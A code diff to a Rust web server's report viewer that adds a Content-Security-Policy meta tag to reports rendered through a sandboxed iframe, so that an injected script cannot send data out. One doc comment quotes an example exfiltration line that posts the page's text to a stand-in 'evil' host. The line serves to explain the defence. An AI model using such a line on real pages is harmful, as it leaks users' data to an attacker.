@@ -160,6 +160,12 @@ pub async fn serve(
     eprintln!(
         "         (the URL carries this session's access token — the API refuses requests without it)"
     );
+    // Printed as a whole URL, token and all. `/reports` is a second document,
+    // and the token it reads lives in *per-tab* sessionStorage: following the
+    // review UI's own reports link works because that is the same tab, but a
+    // fresh tab or a bookmark has nothing to read, and "open the URL printed at
+    // startup" would only land the reader back on `/`.
+    eprintln!("         rendered reports: http://127.0.0.1:{port}/reports?token={token}");
     eprintln!(
         "  mode   {}",
         if allow_mutations {
@@ -273,6 +279,12 @@ async fn reports_list(State(st): State<UiState>) -> Response {
 /// no reach into `sessionStorage` (where the access token lives) and no reach
 /// into this page. A plain `<a href>` could not carry the bearer header
 /// anyway, so the fetch is not an extra cost.
+///
+/// That sandbox is only half the containment, and the half that stops a report
+/// *reading* this page. What stops it *sending* is the policy the server writes
+/// into the report itself ([`REPORT_META_CSP`]) -- deliberately not a policy on
+/// this shell, because a `sandbox` here would sandbox the shell's own scripts,
+/// which are what read the token and do the fetch.
 const REPORTS_SHELL: &str = r#"<!doctype html><html lang="en"><head><meta charset="utf-8">
 <title>Reports</title><style>
 body{font:15px/1.6 system-ui,sans-serif;margin:0;padding:24px;color:#1c1f24}
@@ -315,7 +327,10 @@ function fail(message) {
 // srcdoc, not src: the frame is sandboxed without the same-origin escape
 // hatch, so the report runs in an opaque origin and cannot read this page, its
 // storage or its token even if a market name smuggled a script into the
-// rendered HTML.
+// rendered HTML. The srcdoc document inherits its policy from *this* page, not
+// from the fetch response, which is why the server writes the report's CSP into
+// the report's own `<head>` instead of relying on a response header no document
+// is built from.
 async function openReport(name) {
   const res = await fetch("/report/" + encodeURIComponent(name), { headers: auth });
   if (!res.ok) { fail("could not load " + name + " (HTTP " + res.status + ")"); return; }
@@ -328,8 +343,13 @@ async function openReport(name) {
   try {
     const res = await fetch("/api/reports", { headers: auth });
     if (!res.ok) {
+      // The token lives in sessionStorage, which is per tab, so "reload the
+      // startup URL" is the wrong advice here: it lands on `/`. Name the form
+      // that actually fixes this tab.
       fail(res.status === 401
-        ? "no access token: open the UI through the exact URL printed at startup"
+        ? "no access token for this tab: reopen as /reports?token=… "
+          + "(the startup banner prints that URL), or follow the reports link "
+          + "in the review UI"
         : "could not list reports (HTTP " + res.status + ")");
       return;
     }
@@ -362,19 +382,147 @@ async fn reports_index() -> Html<&'static str> {
     Html(REPORTS_SHELL)
 }
 
-/// Content-Security-Policy sent with every rendered report.
+/// Content-Security-Policy *header* sent with every rendered report.
+///
+/// This is the navigation copy of the policy and only bites when a report
+/// becomes a document from this response: `curl`, a direct open of
+/// `/report/{name}`, any future `src=` embed. It is **not** what protects the
+/// shell's frame. There the report is pulled with `fetch`, and a CSP header on
+/// a fetch response is metadata hanging off a `Response` object that no
+/// document is ever created from. That path is covered by [`REPORT_META_CSP`],
+/// which travels inside the bytes.
 ///
 /// `sandbox` without `allow-same-origin` drops the document into an opaque
 /// origin: even fetched straight from this port it cannot read
 /// `sessionStorage["h5i_token"]`, cannot touch a parent page, and cannot make
 /// a same-origin call to `/api/plan/{table}/{id}/apply`. `allow-scripts` stays
-/// because reports draw their own charts. Everything else is denied because a
-/// report is self-contained by construction (inline `<style>`, inline
-/// `<script>`, SVG built in the page), so nothing legitimate makes a network
-/// request and an injected script has nowhere to send what it stole.
+/// because reports draw their own charts, and it has to stay in the frame's
+/// `sandbox=` attribute too: when a document is under two sandboxes it gets
+/// only what both allow, so dropping it from either kills every chart.
+/// Everything else is denied because a report is self-contained by
+/// construction (inline `<style>`, inline `<script>`, SVG built in the page,
+/// no external reference and no `eval` -- see
+/// `h5i_db/quant/report.py` and `basket.py`), so nothing legitimate makes a
+/// network request.
 const REPORT_CSP: &str = "sandbox allow-scripts; default-src 'none'; \
      script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; \
      font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";
+
+/// The same policy, carried *inside* the served report document.
+///
+/// A header protected nothing on the path reports actually take. The shell
+/// pulls a report with `fetch` and assigns the text to `frame.srcdoc`; the
+/// document created from `srcdoc` inherits the CSP of its **embedder**, and the
+/// embedder (`/reports`) sends none, so the rendered report ran with no policy
+/// at all. Sandboxing an iframe stops it *reading* cross-origin responses, not
+/// *sending* requests, so with no policy on the document
+/// `new Image().src = "https://evil/?" + document.body.innerText` still walks a
+/// strategy's numbers out from inside the sandbox. Shipping the policy as a
+/// `<meta http-equiv>` in the document's own head ends that class of gap: the
+/// bytes carry their policy, so whoever parses them enforces it, and the
+/// srcdoc path stops depending on response metadata nobody reads.
+///
+/// `sandbox` is absent on purpose. A `<meta>` policy may not carry it (nor
+/// `frame-ancestors`, nor `report-uri`) and browsers drop the directive, so
+/// writing it here would be theatre of exactly the kind this constant exists to
+/// undo. The opaque origin comes instead from the frame's
+/// `sandbox="allow-scripts"` attribute, which is a real sandbox and was the one
+/// control here that ever actually ran. Every other directive must stay in step
+/// with [`REPORT_CSP`]; `report_policies_stay_in_step` in `tests/api.rs` fails
+/// if they drift.
+const REPORT_META_CSP: &str = "<meta http-equiv=\"Content-Security-Policy\" content=\"\
+     default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; \
+     img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; \
+     base-uri 'none'\">";
+
+/// Byte offset just past a leading doctype, or 0 when there is not one.
+///
+/// Only ever used to answer "where may markup be inserted without changing how
+/// the page renders". Inserting above a doctype puts the document into quirks
+/// mode, which would reflow reports that render correctly today, so a doctype
+/// is stepped over rather than displaced. `lower` is the ASCII-lowercased body,
+/// whose byte offsets match the original because ASCII case folding is
+/// one-byte-for-one-byte.
+fn doctype_end(lower: &str) -> usize {
+    let lead = lower.len() - lower.trim_start().len();
+    if !lower[lead..].starts_with("<!doctype") {
+        return 0;
+    }
+    lower[lead..].find('>').map_or(0, |end| lead + end + 1)
+}
+
+/// Byte offset just past the `>` closing the start tag that begins at `at`,
+/// ignoring any `>` inside a quoted attribute value the way an HTML tokenizer
+/// does. `None` when the tag is never closed.
+fn tag_end(lower: &str, at: usize) -> Option<usize> {
+    let mut quote: Option<u8> = None;
+    for (offset, &byte) in lower.as_bytes()[at..].iter().enumerate() {
+        match (quote, byte) {
+            (Some(open), current) if current == open => quote = None,
+            (Some(_), _) => {}
+            (None, b'"' | b'\'') => quote = Some(byte),
+            (None, b'>') => return Some(at + offset + 1),
+            (None, _) => {}
+        }
+    }
+    None
+}
+
+/// Byte offset just past the document's `<head …>` start tag, or `None`.
+///
+/// Two things a plain substring search gets wrong, both of which end with a
+/// policy that quietly governs nothing. `<head` is a prefix of `<header>`, and
+/// a body-level `<header>` in a head-less report would place the policy *below*
+/// the content it exists to constrain, so the tag name has to actually end
+/// there. And the closing `>` is the one outside quotes: `<head data-x="a>b">`
+/// otherwise splits mid-attribute and the injected tag is swallowed as
+/// attributes of `head`.
+fn head_tag_end(lower: &str) -> Option<usize> {
+    const HEAD: &str = "<head";
+    let mut from = 0;
+    while let Some(found) = lower[from..].find(HEAD) {
+        let at = from + found;
+        let name_ends = lower.as_bytes()[at + HEAD.len()..]
+            .first()
+            .copied()
+            .is_none_or(|byte| matches!(byte, b'>' | b'/') || byte.is_ascii_whitespace());
+        if name_ends {
+            return tag_end(lower, at);
+        }
+        from = at + HEAD.len();
+    }
+    None
+}
+
+/// Put [`REPORT_META_CSP`] into a report, as the first thing a parser meets
+/// inside the head.
+///
+/// Position is load-bearing twice. A meta policy governs only what the parser
+/// reads *after* it, so it goes ahead of every other head child rather than
+/// merely somewhere in the file; and browsers honour it only in the head, so a
+/// head-less report (`basket.py` writes `<!doctype html><meta charset=…>` with
+/// no explicit `<head>`) gets it at the top of the document instead, where the
+/// parser hoists it into the head it implies. The charset declaration stays
+/// well inside its 1 KiB budget behind a tag this short, and the response's own
+/// `charset=utf-8` outranks it anyway.
+///
+/// The first real `<head` in the file is the document's own: report content is
+/// written below it, into the body. And a second policy smuggled into that
+/// content cannot widen this one, because a browser enforces every delivered
+/// policy independently and a request must satisfy all of them -- an extra
+/// policy can only subtract.
+fn with_report_csp(body: &str) -> String {
+    let lower = body.to_ascii_lowercase();
+    // A head that could not be parsed falls back to the top of the document,
+    // never to the end of it: an unreadable head is a reason to put the policy
+    // first, not a reason to put it somewhere it covers nothing.
+    let at = head_tag_end(&lower).unwrap_or_else(|| doctype_end(&lower));
+    let mut out = String::with_capacity(body.len() + REPORT_META_CSP.len());
+    out.push_str(&body[..at]);
+    out.push_str(REPORT_META_CSP);
+    out.push_str(&body[at..]);
+    out
+}
 
 /// Read one report, refusing anything that is not a regular file sitting
 /// directly inside the reports directory.
@@ -419,7 +567,10 @@ async fn report(State(st): State<UiState>, AxPath(name): AxPath<String>) -> Resp
                 (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
                 (header::REFERRER_POLICY, "no-referrer"),
             ],
-            body,
+            // The policy goes in the body, not just the headers: the shell
+            // renders reports through `srcdoc`, where response headers are
+            // never consulted.
+            with_report_csp(&body),
         )
             .into_response(),
         None => (StatusCode::NOT_FOUND, "no such report").into_response(),
